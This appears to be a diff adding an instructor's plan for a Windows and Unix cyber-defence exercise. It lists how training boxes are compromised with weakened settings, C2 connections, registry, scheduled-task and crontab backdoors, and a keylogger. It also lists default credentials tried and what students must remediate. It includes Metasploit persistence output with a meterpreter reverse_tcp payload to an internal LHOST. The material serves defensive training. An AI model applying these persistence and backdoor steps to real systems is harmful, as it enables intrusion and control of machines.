@@ -1,0 +1,89 @@
+WINDOWS TEST:
+
+What I do before they get on the box:
+create users with bad passwords-
+turn off uac-
+remove firewall rules-
+turn off firewall-
+put malware in tmp folder-
+[+] Persistent VBS script written on WC-321312F to C:\Users\student\AppData\Local\Temp\QfTATi.vbs
+[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\yhkTjBmnrlGVF
+[*] Clean up Meterpreter RC file: /root/.msf4/logs/persistence/WC-321312F_20180214.4827/WC-321312F_20180214.4827.rc
+
+[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WC-321312F_20180214.5241/WC-321312F_20180214.5241.rc
+[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.19.0.80 LPORT=4444
+[+] Persistent Script written to C:\Users\student\AppData\Local\Temp\VXloSytBu.vbs
+
+have open connection with c2 server (powershell and cmd)-
+have connection with asynchronous malware that uses scheduled tasks-
+put backdoor in registry-
+keylogger-
+
+What I do when they are on the box:
+create connections from other boxes to monitor connectivity
+create svchost.exe with metasploit
+attempt to get into host machine-IP Student/CyberRange
+attempt to login to all accounts-Student/password,Administrator/password,user[1-100]/changeme
+add user
+change/turn off firewall
+change all account passwords
+rick roll/rdp
+check random ports being open
+
+What they need to do initially:
+change host password
+change all user account passwords
+update windows
+turn on UAC
+firewall- all ports but traffic into/from rdp, service ports
+remove malware in tmp folder
+remove open connections/asynchronous malware
+remove malicious scheduled task
+stuff in registry
+create ids script
+install madcraps
+patch exploitable service
+
+What they need to respond to:
+remove added user
+put firewall rules back
+get back on the box
+
+
+UNIX TEST:
+
+What I do before they get on the box:
+create users with bad passwords
+put regular user in sudoers file
+create world writeable file/file without owner/other user with uid of 0/empty password
+remove firewall rules
+put malware in tmp folder
+have open connection with c2 server
+have connection with asynchronous malware that uses crontab
+
+What I do when they are on the box:
+attempt to get into host machine
+change regular user password
+add user
+change/turn off firewall
+change all account passwords
+
+What they need to do initially:
+change host password
+change all user account passwords
+apt update && apt upgrade
+regular user in sudoers file
+world writeable file/file without owner/other user with uid of 0/empty password
+firewall- all ports but traffic into/from ssh, service ports
+move ssh to nonstandard port
+remove malware in tmp folder
+remove open connections/asynchronous malware
+remove malicious crontab
+create ids script
+install madcraps
+patch exploitable service
+
+What they need to respond to:
+remove added user
+put firewall rules back
+get back on the box
